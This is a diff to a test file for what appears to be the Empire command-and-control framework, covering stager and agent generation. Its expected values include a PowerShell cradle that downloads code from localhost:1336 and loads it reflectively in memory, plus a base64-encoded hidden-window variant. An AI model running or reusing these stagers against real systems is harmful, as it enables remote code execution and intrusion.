@@ -6,6 +6,7 @@ from pathlib import Path
 import pytest
 
 from empire.server.common.empire import MainMenu
+from empire.server.stagers.multi.generate_agent import Stager
 from empire.server.utils.file_util import run_as_user
 
 is_arm = platform.machine().startswith("arm") or platform.machine().startswith(
@@ -48,12 +49,12 @@ def test_generate_launcher(stager_generation_service):
         (
             False,
             False,
-            """$wc=New-Object System.Net.WebClient;$bytes=$wc.DownloadData("http://localhost:1336/download/powershell/");$assembly=[Reflection.Assembly]::load($bytes);$assembly.GetType("Program").GetMethod("Main").Invoke($null, $null);""",
+            """$wc=New-Object System.Net.WebClient;$bytes=$wc.DownloadData("http://localhost:1336/download/powershell/");$assembly=[Reflection.Assembly]::load($bytes);$assembly.EntryPoint.Invoke($null,$null);""",
         ),
         (
             False,
             True,
-            "powershell -noP -sta -w 1 -enc  JAB3AGMAPQBOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ADsAJABiAHkAdABlAHMAPQAkAHcAYwAuAEQAbwB3AG4AbABvAGEAZABEAGEAdABhACgAIgBoAHQAdABwADoALwAvAGwAbwBjAGEAbABoAG8AcwB0ADoAMQAzADMANgAvAGQAbwB3AG4AbABvAGEAZAAvAHAAbwB3AGUAcgBzAGgAZQBsAGwALwAiACkAOwAkAGEAcwBzAGUAbQBiAGwAeQA9AFsAUgBlAGYAbABlAGMAdABpAG8AbgAuAEEAcwBzAGUAbQBiAGwAeQBdADoAOgBsAG8AYQBkACgAJABiAHkAdABlAHMAKQA7ACQAYQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQAVAB5AHAAZQAoACIAUAByAG8AZwByAGEAbQAiACkALgBHAGUAdABNAGUAdABoAG8AZAAoACIATQBhAGkAbgAiACkALgBJAG4AdgBvAGsAZQAoACQAbgB1AGwAbAAsACAAJABuAHUAbABsACkAOwA=",
+            "powershell -noP -sta -w 1 -enc  JAB3AGMAPQBOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ADsAJABiAHkAdABlAHMAPQAkAHcAYwAuAEQAbwB3AG4AbABvAGEAZABEAGEAdABhACgAIgBoAHQAdABwADoALwAvAGwAbwBjAGEAbABoAG8AcwB0ADoAMQAzADMANgAvAGQAbwB3AG4AbABvAGEAZAAvAHAAbwB3AGUAcgBzAGgAZQBsAGwALwAiACkAOwAkAGEAcwBzAGUAbQBiAGwAeQA9AFsAUgBlAGYAbABlAGMAdABpAG8AbgAuAEEAcwBzAGUAbQBiAGwAeQBdADoAOgBsAG8AYQBkACgAJABiAHkAdABlAHMAKQA7ACQAYQBzAHMAZQBtAGIAbAB5AC4ARQBuAHQAcgB5AFAAbwBpAG4AdAAuAEkAbgB2AG8AawBlACgAJABuAHUAbABsACwAJABuAHUAbABsACkAOwA=",
         ),
     ],
 )
@@ -368,3 +369,43 @@ def test_generate_stageless(stager_generation_service, language, expected_substr
 
 def test_generate_upload(stager_generation_service):
     pass
+
+
+def test_multi_generate_agent_stageless_powershell(main):
+    stager = Stager(main)
+    stager.options["Language"]["Value"] = "powershell"
+    stager.options["Listener"]["Value"] = "new-listener-1"
+    stager.options["Staged"]["Value"] = "False"
+
+    result = stager.generate()
+
+    assert isinstance(result, str), "Expected generated code to be a string"
+    assert "function Invoke-Empire {" in result
+    assert "function Start-Negotiate {" in result
+    assert '$ErrorActionPreference = "SilentlyContinue"' in result
+
+
+def test_multi_generate_agent_staged_powershell(main):
+    stager = Stager(main)
+    stager.options["Language"]["Value"] = "powershell"
+    stager.options["Listener"]["Value"] = "new-listener-1"
+    stager.options["Staged"]["Value"] = "True"
+
+    result = stager.generate()
+
+    assert isinstance(result, str), "Expected generated code to be a string"
+    assert "function Invoke-Empire {" not in result
+    assert "DownloadData(" in result or "WebClient" in result
+
+
+def test_multi_generate_agent_stageless_python(main):
+    stager = Stager(main)
+    stager.options["Language"]["Value"] = "python"
+    stager.options["Listener"]["Value"] = "new-listener-1"
+    stager.options["Staged"]["Value"] = "False"
+
+    result = stager.generate()
+
+    assert isinstance(result, str), "Expected generated code to be a string"
+    assert "def run(" in result
+    assert "class Stage" in result
